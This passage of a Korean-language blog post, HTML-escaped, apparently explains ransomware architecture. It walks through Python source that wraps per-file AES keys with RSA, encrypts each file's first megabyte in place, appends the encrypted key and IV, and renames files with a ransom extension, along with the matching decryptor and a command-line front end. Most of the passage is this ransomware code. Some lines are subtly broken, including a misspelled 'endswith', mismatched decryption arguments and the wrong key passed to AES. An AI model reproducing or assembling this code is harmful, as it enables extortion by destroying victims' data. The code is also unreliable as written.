size/8&lt;/code&gt;)&amp;#xACFC; &amp;#xAC19;&amp;#xC544;&amp;#xC57C; &amp;#xD55C;&amp;#xB2E4;. 2048bit RSA&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xBBC0;&amp;#xB85C; 256 bytes&amp;#xC758; resulting cyphertext&amp;#xAC00; &amp;#xB098;&amp;#xC640;&amp;#xC57C; &amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC81C; &amp;#xCF54;&amp;#xB4DC;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;rsaEncryptSecret&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;string, publicKey&lt;/span&gt;):&lt;/span&gt;
	  public_key = get_key(publicKey, &lt;span class=&#34;hljs-literal&#34;&gt;None&lt;/span&gt;)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# Create the cipher object&lt;/span&gt;
	  cipher_rsa = PKCS1_OAEP.new(public_key)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# We need to encode the string to work with bytes instead of chars&lt;/span&gt;
	  bytestrings = str.encode(string)
	  cipher_text = cipher_rsa.encrypt(bytestrings)
	  &lt;span class=&#34;hljs-comment&#34;&gt;#At this point the cipher_text should be 256 bytes in length&lt;/span&gt;
	  &lt;span class=&#34;hljs-comment&#34;&gt;# We&amp;apos;ll base64 encode it for convenience&lt;/span&gt;
	  &lt;span class=&#34;hljs-comment&#34;&gt;# Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding &lt;/span&gt;
	  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; base64.b64encode(cipher_text)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%203.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Source: &lt;a href=&#34;https://stackoverflow.com/questions/13378815/base64-length-calculation&#34;&gt;https://stackoverflow.com/questions/13378815/base64-length-calculation&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;RsaDecryptSecret&#34;&gt;&lt;a href=&#34;#RsaDecryptSecret&#34; class=&#34;headerlink&#34; title=&#34;RsaDecryptSecret&#34;&gt;&lt;/a&gt;RsaDecryptSecret&lt;/h1&gt;&lt;p&gt;&amp;#xC81C;&amp;#xACF5;&amp;#xB41C; secret key&amp;#xB85C; cipher text&amp;#xB97C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;rsaDecryptSecret&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;string, privateKey&lt;/span&gt;):&lt;/span&gt;
	  &lt;span class=&#34;hljs-comment&#34;&gt;# We firts import the private Key&lt;/span&gt;
	  private_key = get_key(privateKey, &lt;span class=&#34;hljs-literal&#34;&gt;None&lt;/span&gt;)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# Decode the base64 encoded string&lt;/span&gt;
	  base64DecodedSecret = base64.b64decode(string)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# create the cipher object&lt;/span&gt;
	  cipher_rsa = PKCS1_OAEP.new(private_key)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# Decrypt the content&lt;/span&gt;
	  decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret)
	  &lt;span class=&#34;hljs-comment&#34;&gt;# Remember to convert the decoded cipher from bytes to string&lt;/span&gt;
	  decryptedSecret = decryptedBytestrings.decode()
	  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; decryptedSecret&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;SymEncryptFile&#34;&gt;&lt;a href=&#34;#SymEncryptFile&#34; class=&#34;headerlink&#34; title=&#34;SymEncryptFile&#34;&gt;&lt;/a&gt;SymEncryptFile&lt;/h1&gt;&lt;p&gt;&amp;#xC8FC;&amp;#xC694; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xD568;&amp;#xC218;&amp;#xC774;&amp;#xBA70; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xB3D9;&amp;#xC791;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;publicKey&amp;#xC640; file path&amp;#xB97C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;symEncryptFile&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;publicKey, file&lt;/span&gt;):&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD2B9;&amp;#xC815; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xB79C;&amp;#xB364; &amp;#xD0A4;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;key = generateKey()&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;publicKey&amp;#xB85C; &amp;#xB79C;&amp;#xB364; &amp;#xD0A4;&amp;#xB97C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;encryptedKey = rsaEncryptSecret(key, publicKey)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xC0AC;&amp;#xC774;&amp;#xC988;(n byte)&amp;#xB97C; &amp;#xC815;&amp;#xC758;&amp;#xD55C;&amp;#xB2E4;. &amp;#xC608;&amp;#xC2DC;&amp;#xB85C; 1MB&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;buffer_size = &lt;span class=&#34;hljs-number&#34;&gt;1048576&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xC774;&amp;#xBBF8; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB418;&amp;#xC5C8;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD55C;&amp;#xB2E4;. &amp;#xC774;&amp;#xBBF8; &amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xC744; &amp;#xACBD;&amp;#xC6B0; &amp;#xBB34;&amp;#xC2DC;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; file.endswitch(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt; + cryptoName):
		print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;File is already encrypted, skipping&amp;apos;&lt;/span&gt;)
		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xCCAB; n &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xACE0; content&amp;#xB97C; overwrite &amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# Open the input and output files&lt;/span&gt;
		input_file = open(file, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;r+b&amp;apos;&lt;/span&gt;)
		print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Encrypting file: &amp;quot;&lt;/span&gt;+ file)
		output_file = open(file + &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;.&amp;apos;&lt;/span&gt; + cryptoName, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;w+b&amp;apos;&lt;/span&gt;)

&lt;span class=&#34;hljs-comment&#34;&gt;# Create the cipher object and encrypt the data&lt;/span&gt;
		cipher_encrypt = AES.new(key, AES.MODE_CFB)

&lt;span class=&#34;hljs-comment&#34;&gt;# Encrypt file first&lt;/span&gt;
		input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
		buffer = input_file.read(buffer_size)
		ciphered_bytes = cipher_encrypt.encrypt(buffer)

input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
input_file.write(ciphered_bytes)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; &lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%204.png&#34; alt&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xB05D;&amp;#xC5D0; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xB79C;&amp;#xB364; &amp;#xD0A4;&amp;#xB97C; &amp;#xCD94;&amp;#xAC00;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, os.SEEK_END)
input_file.write(encryptedKey.encode())&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xB05D;&amp;#xC5D0; AES IV(initialization vector)&amp;#xB97C; &amp;#xCD94;&amp;#xAC00;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, os.SEEK_END)
input_file.write(cipher_encrypt.iv)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xAC00; &amp;#xB41C; &amp;#xC9C0; &amp;#xC2DD;&amp;#xBCC4;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xBC14;&amp;#xAFBC;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;input_file.close()
  os.rename(file, file + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt; + cryptoName)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%205.png&#34; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xD6C4; &amp;#xB300;&amp;#xB7B5;&amp;#xC801;&amp;#xC778; &amp;#xD30C;&amp;#xC77C; &amp;#xAD6C;&amp;#xC870;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xC804;&amp;#xCCB4; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD560; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC5C6;&amp;#xC5C8;&amp;#xB358; &amp;#xAC83;&amp;#xC744; &amp;#xC0DD;&amp;#xAC01;&amp;#xD574;&amp;#xB77C;. file object&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;seek()&lt;/code&gt; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xD0D0;&amp;#xC0C9;&amp;#xD558;&amp;#xACE0; &amp;#xBE60;&amp;#xB974;&amp;#xAC8C; &amp;#xC791;&amp;#xC5C5;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xC774;&amp;#xB294; &amp;#xBCF5;&amp;#xD638;&amp;#xD654; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB610; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; AES IV&amp;#xC640; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD0A4;&amp;#xB97C; &amp;#xBAA8;&amp;#xB450; &amp;#xCD94;&amp;#xAC00;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xAC01; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD0A4;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xD14D;&amp;#xC2A4;&amp;#xD2B8; &amp;#xD30C;&amp;#xC77C;&amp;#xC740; &amp;#xD544;&amp;#xC694; &amp;#xC5C6;&amp;#xB2E4;. victim&amp;#xC740; &amp;#xC6B0;&amp;#xB9AC;&amp;#xC5D0;&amp;#xAC8C; &amp;#xC5B4;&amp;#xB5A4; &amp;#xD30C;&amp;#xC77C;&amp;#xC774;&amp;#xB4E0; &amp;#xBCF4;&amp;#xB0BC; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xD2B9;&amp;#xC815;&amp;#xD55C; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; private key&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xC788;&amp;#xC73C;&amp;#xBA74; &amp;#xC6B0;&amp;#xB9AC;&amp;#xB294; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%206.png&#34; alt&gt;&lt;/p&gt;
&lt;h1 id=&#34;SymDecryptFile&#34;&gt;&lt;a href=&#34;#SymDecryptFile&#34; class=&#34;headerlink&#34; title=&#34;SymDecryptFile&#34;&gt;&lt;/a&gt;SymDecryptFile&lt;/h1&gt;&lt;p&gt;&amp;#xC8FC;&amp;#xC694; &amp;#xBCF5;&amp;#xD638;&amp;#xD654; &amp;#xD568;&amp;#xC218;&amp;#xC774;&amp;#xBA70; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xB3D9;&amp;#xC791;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;privateKey&amp;#xC640; file path&amp;#xB97C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;symDecryptFile&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;privateKey, file&lt;/span&gt;):&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; decryption size(n &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;, &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xC5D0;&amp;#xC11C; &amp;#xC4F4; &amp;#xAC83;&amp;#xACFC; &amp;#xB3D9;&amp;#xC77C;)&amp;#xB97C; &amp;#xC815;&amp;#xC758;&amp;#xD574;&amp;#xB77C;. &amp;#xC608;&amp;#xC2DC;&amp;#xB294; 1MB&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;buffer_size = &lt;span class=&#34;hljs-number&#34;&gt;1048576&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD655;&amp;#xC7A5;&amp;#xC790;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xC5EC;&amp;#xBD80;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; file.endswith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt; + cryptoName):
		out_filename = file[:-(len(cryptoName) + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)]
		print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Decrypting file: &amp;quot;&lt;/span&gt; + file)
&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; :
	print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;File is not encrypted&amp;apos;&lt;/span&gt;)
	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC5F4;&amp;#xC5B4; AES IV(&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; 16&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;)&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC628;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;input_file = open(file, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;r+b&amp;apos;&lt;/span&gt;)

&lt;span class=&#34;hljs-comment&#34;&gt;# Read in the iv&lt;/span&gt;
input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;-16&lt;/span&gt;, os.SEEK_END)
iv = input_file.read(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654; &amp;#xD0A4;&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4;&amp;#xC628;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# we move the pointer to 274 bbytes before the end of file&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;# (258 bytes of the encryption key + 16 of the AES IV)&lt;/span&gt;
input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;-274&lt;/span&gt;, os.SEEK_END)

&lt;span class=&#34;hljs-comment&#34;&gt;# And we read the 258 bytes of the key&lt;/span&gt;
secret = input_file.read(&lt;span class=&#34;hljs-number&#34;&gt;258&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;private key&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD0A4;&amp;#xB97C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;key = rsaDecryptSecret(cert, secret)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xC774;&amp;#xC804;&amp;#xC5D0; &amp;#xC815;&amp;#xC758;&amp;#xD55C; aes-encrypted buffer size&amp;#xB97C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xACE0; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xCCAB; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; &amp;#xC791;&amp;#xC131;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# Create the cipher object&lt;/span&gt;
cipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv)

&lt;span class=&#34;hljs-comment&#34;&gt;# Read the encrypted header&lt;/span&gt;
input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
buffer = input_file.read(buffer_size)

&lt;span class=&#34;hljs-comment&#34;&gt;# Decrypt the header with the key&lt;/span&gt;
decrypted_bytes = cipher_encrypt.decrypt(buffer)

&lt;span class=&#34;hljs-comment&#34;&gt;# Write the decrypted text on the same file&lt;/span&gt;
input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
input_file.write(decrypted_bytes)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xB05D; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0;&amp;#xC11C; IV&amp;#xC640; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xD0A4;&amp;#xB97C; &amp;#xC81C;&amp;#xAC70;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xBCC0;&amp;#xACBD;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# Delete the last 274 bytes from IV + key.&lt;/span&gt;
input_file.seek(&lt;span class=&#34;hljs-number&#34;&gt;-274&lt;/span&gt;, os.SEEK_END)
input_file.truncate()
input_file.close()

&lt;span class=&#34;hljs-comment&#34;&gt;# Rename the file to delete the encrypted extenstion&lt;/span&gt;
os.rename(file, out_filename)&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;-&amp;#xACE0;&amp;#xB824;&amp;#xC0AC;&amp;#xD56D;&#34;&gt;&lt;a href=&#34;#&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;-&amp;#xACE0;&amp;#xB824;&amp;#xC0AC;&amp;#xD56D;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xACE0;&amp;#xB824;&amp;#xC0AC;&amp;#xD56D;&#34;&gt;&lt;/a&gt;&amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xACE0;&amp;#xB824;&amp;#xC0AC;&amp;#xD56D;&lt;/h1&gt;&lt;p&gt;&amp;#xBAA8;&amp;#xB4E0; &amp;#xD568;&amp;#xC218; &amp;#xC791;&amp;#xC131;&amp;#xC774; &amp;#xB05D;&amp;#xB098;&amp;#xBA74; &amp;#xC120;&amp;#xD0DD;&amp;#xD55C; &amp;#xD3F4;&amp;#xB354;&amp;#xB97C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xAC70;&amp;#xB098; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB97C; &amp;#xB9CC;&amp;#xB4E4; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xC815;&amp;#xD655;&amp;#xD558;&amp;#xAC8C; &lt;code&gt;symEncryptDirectory/symDecryptDirectory&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xCF54;&amp;#xB529;&amp;#xD588;&amp;#xC73C;&amp;#xBA74; &amp;#xC554;&amp;#xD638;&amp;#xD654;, &amp;#xBCF5;&amp;#xD638;&amp;#xD654; &amp;#xC911; &amp;#xD558;&amp;#xB098;&amp;#xB97C; &amp;#xC120;&amp;#xD0DD;&amp;#xD55C; &amp;#xD6C4; &lt;code&gt;.pem&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xAE30;&amp;#xB9CC; &amp;#xD558;&amp;#xBA74; &amp;#xB41C;&amp;#xB2E4;. main &amp;#xD638;&amp;#xCD9C; &amp;#xC804;&amp;#xC5D0; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC774;&amp;#xAC83;&amp;#xACFC; &amp;#xBE44;&amp;#xC2B7;&amp;#xD55C; &amp;#xAC83;&amp;#xC774; &amp;#xC788;&amp;#xC744; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;parser = argparse.ArgumentParser()
parser.add_argument(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;--dest&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;-d&amp;quot;&lt;/span&gt;, help=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;File or directory to encrypt/decrypt&amp;quot;&lt;/span&gt;, dest=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;destination&amp;quot;&lt;/span&gt;, default=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;none&amp;quot;&lt;/span&gt;, required=&lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;)
parser.add_argument(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;--action&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;-a&amp;quot;&lt;/span&gt;, help=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Action (encrypt/decrypt)&amp;quot;&lt;/span&gt;, dest=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;action&amp;quot;&lt;/span&gt;, required=&lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;)
 
parser.add_argument(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;--pem&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;-p&amp;quot;&lt;/span&gt;, help=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Public/Private key&amp;quot;&lt;/span&gt;, dest=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;, required=&lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
